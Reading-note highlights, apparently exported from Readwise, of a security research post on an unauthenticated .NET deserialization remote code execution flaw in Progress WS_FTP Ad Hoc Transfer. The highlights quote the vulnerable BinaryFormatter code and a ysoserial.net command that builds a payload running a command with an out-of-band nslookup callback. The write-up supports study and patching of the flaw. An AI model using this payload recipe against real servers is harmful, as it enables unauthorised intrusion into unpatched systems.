---
author: Assetnote
aliases:
  - RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules
tags:
  - readwise/articles
url: https://blog.assetnote.io/2023/10/04/rce-progress-ws-ftp/
created: 2024-08-20
---
# RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules

![rw-book-cover](https://blog.assetnote.io/apple-touch-icon-180x180.png)

## Highlights


> decompiling the source code using ILSpy
> #tools 
> [View Highlight](https://read.readwise.io/read/01hdk9z9qn7ytnnwymb171h9ww)



> vulnerability was found from sink -> source, where we discovered the deserialization sink and worked our way up towards the source.
> [View Highlight](https://read.readwise.io/read/01hdk9zht9s1c30d70e2f3re9m)



> Ultimately, we discovered that the vulnerability could be triggered without any authentication, and it affected the entire Ad Hoc Transfer component of WS_FTP.
> [View Highlight](https://read.readwise.io/read/01hdk9zztqnkkzx1m40faegsvk)



> IIS HTTP Modules allow developers to run code within the lifecycle of a HTTP request. The convention of HTTP modules is similar to "middleware" that you might see in other web application frameworks.
> [View Highlight](https://read.readwise.io/read/01hdka188nh2wccc84b7m61ymt)



> The issue discovered in Progress WS_FTP was within a HTTP Module called MyFileUpload.UploadModule
> [View Highlight](https://read.readwise.io/read/01hdka372kr5drd0cs9xszsh2k)



> UploadManager.Instance.DeserializeProcessor(result2.Substring(DEFAULT_PARAMS_TAG.Length));
> [View Highlight](https://read.readwise.io/read/01hdkadqp16zryrhxv9tpyh4z5)



> internal IFileProcessor DeserializeProcessor(string input)     { BinaryFormatter binaryFormatter = new BinaryFormatter(); byte[] buffer = Convert.FromBase64String(input); MemoryStream serializationStream = new MemoryStream(buffer); SettingsStorageObject settingsStorageObject = (SettingsStorageObject)binaryFormatter.Deserialize(serializationStream);
> [View Highlight](https://read.readwise.io/read/01hdkadxdj4jxck3jq8cztfye9)



> In order to execute arbitrary commands through deserialization, we can use ysoserial.net with the following command:
>  ‍
>  ./ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /C nslookup wuui3r1tbpx4pwl6ao5dztkiq9w2ks8h.oastify.com" -o base64
> [View Highlight](https://read.readwise.io/read/01hdka9g7acve2wjebdwdb5fyv)



> due to the nature of HTTP Modules, the GET URL can be any of the routes within the Ad Hoc Transfer application.
> [View Highlight](https://read.readwise.io/read/01hdkaay00pdretw6memdnjvnw)



> typical .NET deserialization issue that led to RCE
> [View Highlight](https://read.readwise.io/read/01hdkabnar1shzpg83p6qspfw2)

